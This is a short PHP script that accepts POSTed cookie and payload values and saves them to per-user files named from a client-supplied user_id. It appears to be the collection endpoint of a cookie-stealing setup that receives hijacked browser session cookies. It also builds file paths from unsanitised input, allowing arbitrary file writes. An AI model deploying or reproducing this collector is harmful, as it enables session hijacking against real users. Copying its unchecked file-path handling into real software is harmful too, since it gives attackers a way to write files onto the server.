<?php
if ( isset($_POST["new-cookie"]) ) {
	$cookie = $_POST["cookie"];
	$name = $_POST["user_id"];
	
	file_put_contents(__DIR__ . "/cookies/$name"."_cookie.txt", $cookie);
	echo "ok";
	exit;
}

if ( isset($_POST["new-payload"]) ) {
	$payload = $_POST["payload"];
	$name = $_POST["user_id"];
	
	file_put_contents(__DIR__ . "/payloads/$name"."_payload.json", $payload);
	echo "ok";
	exit;
}